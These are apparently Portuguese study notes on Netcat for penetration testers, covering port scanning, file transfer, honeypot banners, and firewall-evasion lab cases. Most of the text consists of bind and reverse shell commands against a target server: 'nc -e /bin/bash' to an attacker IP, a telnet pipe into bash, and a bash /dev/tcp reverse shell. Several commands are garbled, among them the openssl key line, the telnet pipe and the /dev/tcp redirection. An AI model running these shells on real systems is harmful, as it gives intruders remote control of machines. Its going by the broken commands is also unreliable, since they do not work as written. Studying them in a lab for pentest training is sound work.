# Introdução

No tópico a seguir está um resumo sobre o canivete suíço dos pentesters, o Netcat, que tem diversas funções e está presente nos mais variados ataques que um host pode tentar aplicar

## Netcat

O netcat em si tem como principal função realizar e permitir conexões em **sockets** pré-definidos pelos users

Abaixo está representado como iniciar uma conexão e também abrir uma porta para permitir conexões com netcat

```bash
nc -vn <IP> <Porta> : Realiza conexão no socket IP:Porta

nc -vnlp <Porta> : Abre a porta desejada para conexões externas

*-v :Verbose
*-n :Numerical
*-l :Listen (Permite ouvir pela porta)
*-p :Porta
```

*Um item muito importante a se ressaltar é que quando se fecha a conexão entre dois netcats como posto acima é possível conversar via as bashs dessa forma criando um chat entre terminais

**HoneyPot**: Para fazer um HoneyPot mais realista, simule um retorno para a tentativa de conexão do atacante da seguinte forma:

`nc -vnlp 21 < bannerdoFTP.txt`

## UDP and TCP file transfer

Para fazer a transferência de arquivos tanto ao receber quando ao enviar uma conexão é extremamente fácil, basta utilizar o comando de envio > ou <

```bash
nc -vnlp 8080 > ncat.exe :Envia arquivo pela porta

nc -vn 192.168.1.1 8080 < ncat.exe :Manda arquivo pela porta
```

---

# Portscan do Netcat e HoneyPot

Para realizar uma varredura de portas com Netcat é extremamente simples, basta selecionar o argumento certo e utilizar o range de portas como abaixo

```bash
nc -vnz <IP> <PortaI-PortaF>

-z :Comando que permite o range de portas e só testa conexão para portas
```

Outro ponto mt útil que podemos realizar com Netcat é sua função de honeypot que funciona para que possamos simular a abertura de uma porta e dessa forma monitorarmos uma tentativa de ataque entre outras funções.

Para fazer essa simulação de forma correta é importante reproduzir o Banner de acesso ao serviço para que o atacante ache que realmente está acessando, e colocar isso em um looping.

```bash
nc -vnlp <Porta> < bannerDoServico.txt

while True; do nc -vnlp <Porta> < bannerDoServico.txt ;done

#Coloque dentro do looping para que o atacante passe mais de um comando e a conexão
#não se desfaça

while True; do nc -vnlp <Porta> < bannerDoServico.txt >> log.log ;done
#Mande os comandos passados para o arquivo log.log
```

É dessa forma que coletaremos a tentativa de ataque do atacante, pois lembre-se que quando essa conexão é fechada com o netcat um **terminal de chat** é aberto e nós poderemos ver os comandos que o outro user passar…

---- 

# Bind Shell e Reverse Shell

Uma das principais funções do netcat como já vimos na sessão de introdução também é o envio de dados e arquivos para outro host na rede. Além disso é possível **enviar a shell de comando** para esse outro host o que é uma prática extremamente usada por pentesters e atacantes, pois permite um acesso remoto de várias formas.

Para isso existem dois conceitos que precisamos entender.

- `Bind Shell`: Conexão direta de atacante para server via uma porta aberta e uma tentativa via socket.
- `Reverse Shell`: Conexão reversa, onde é o servidor atacado que se conecta a uma porta aberta do host atacante enviando sua bash

## Bind Shell

Como repassado acima no caso da bind shell temos um envio da shell via conexão direta: servidor —> host atacante

```bash
SRV: nc -vnlp <Porta> -e /bin/bash

ATCK: nc -nv <IP do SRV> <Porta>

Atacante recebe a a bash quando se conecta a porta
```

## Reverse Shell

No caso da Reverse shell, que é muito usada para burlar firewalls, temos uma conexão inversa, onde é o servidor que se conecta em uma porta aberta do host atacante e nisso envia sua bash

```bash
SRV: nc -nv <IP do Host Atacante> <Porta> -e /bin/bash

ATCK> nc -vnlp <Porta>
```


----





# Vencendo firewalls (1-4)

Na sessão em que exploraremos a seguir revisaremos 4 possíveis casos em que temos acesso a um servidor e necessitamos enviar a shell dele para um host. Para isso precisamos entender qual a melhor forma de utilizar as técnicas já estudadas para encontrar essa solução

## Caso 1

No primeiro caso, temos um firewall com as regras de fw completamente liberadas (limpa_rules.sh).

Nesse caso utilizaremos uma simples bind shell para resolver a questão

```bash
	SRV: nc -vnlp <Porta qualquer> -e /bin/bash
	
	ATCK: nc -vn <IP do SRV> <Porta>
```

Acesso feito com sucesso!

## Caso 2

No segundo caso se tentarmos o mesmo não será possível fazer o acesso, isto pois aplicando o [rules2.sh](http://rules2.sh) apenas algumas portas estarão abertas para conexão.

Então precisaremos identificar quais portas são essas e fazer a conexão por elas

```bash
SRV: netstat -nlpt :Observa portas abertas

SRV: nc -vnlp <Porta que esteja aberta> -e /bin/bash

ATCK: nc -vn <IP do SRV> <Porta escolhida>
```

## Caso 3

Aplicando dessa vez o [rule3.sh](http://rule3.sh) teremos o FW do Linux bloqueando o acesso a todas as portas de entrada do sistema!

Em casos como esse como a entrada está bloqueada utilizaremos Reverse shell

```bash
ATCK: nc -vnlp 8080

SRV: nc -vn <IP do host ATCK> 8080 -e /bin/bash
```

Perceba que como a saída está liberada é mt fácil fazer esse envio!

## Caso 4

Para finalizar realizaremos o mesmo processo dessa vez com o [rule4.sh](http://rule4.sh) aplicado onde todas as regras de FW estão aplicadas. Nesse novo FW temos regras de saída ativas também.

Nesse caso teremos um passo a mais em nossa Reverse shell, antes de conseguirmos escolher a porta precisamos identificar quais portas o servidor utiliza para a conexão com a internet, com isso:

1. Roda script no SRV que tente abrir as principais portas de acesso a internet (80,443,53 e etc)
2. Roda script no host atacante que abra todas essas portas
3. Roda script novamente no SRV que tente fechar conexão com essas portas do ATCK
4. A partir das que você conseguir ver que houve conexão do socket entre SRV → ATCK você faz a Reverse shell

*Testar portas UDP também

---


# Netcat x Ncat (Criptografia na comunicação)

Ncat é a evolução do netcat, isto pois além de permitir criptografia na comunicação existem outras funções que o ncat pode fornecer que revisaremos a seguir.

Ncat usa praticamente os mesmos comandos base do netcat.

Como encriptar a comunicação via ncat?

1. Gerar chave openssl:
    
    `openssl req -xsoq -newkeyrsa: 2046 -keyout chave.pem -out cert.pem -days 10`
    
2. Abre comunicação com Ncat explicitando chave no server e conecta via host explicitando que a conexão é via ssl
    
    ```bash
    SRV: ncat -vnlp <porta> --ssl-key chave.pem --ssl-cert cert.pem
    
    HOST: ncat -nv <IP> <Porta> --ssl
    ```
    

----




# Telnet

É importante termos uma sessão especificamente para o uso do telnet pois muitas vezes pode se fazer acesso a uma máquina que não tem o Netcat instalado, sendo assim precisamos ser capazes de realizar atividades usando apenas Telnet…

Funções:

- Permite acesso a URLs e IPs via porta (Socket)
- Permite interagir com o serviço conectado

**Permite a Reverse shell:**

```bash
#SRV sendo atacado e não tem netcat:
telnet <IP do host> <Porta 1> | /bin/bash/ <IP> <Porta 2>

#Host do ataque: 
nc -vnlp <Porta 1>
nc -vnlp <Porta 2>

#As duas tem que estar abertas
```

Nesse caso é necessário o uso de **duas portas** porque por **uma ele vai fazer a conexão** e por outra ele vai **mandar o output do que está sendo retornado no terminal**



----



# /DEV/TCP

Para finalizar essa sessão do canivete suiço dos pentesters revisaremos a seguir como fazer o envio de dados e até de uma shell em casos onde nem o telnet está habilitado na máquina linux que estamos acessando. Para isso usaremos a função do /dev/tcp.

O /dev/tcp tem principal função de abrir um socket que pode ou não enviar dados por ele, muitas vezes pode ser enviado um retorno de texto para o socket como abaixo:

`texto.txt > /dev/tcp/<IP>/<Porta>`

Da mesma forma podemos enviar a própria shell da máquina como abaixo:

```bash
bash -i > /dev/tcp/<IP>/<Porta> 0>&2 0>&1

Os ultimos dois argumentos do comando servem para enviar também tanto retornos 
dde erro quanto de retorno do terminal 
```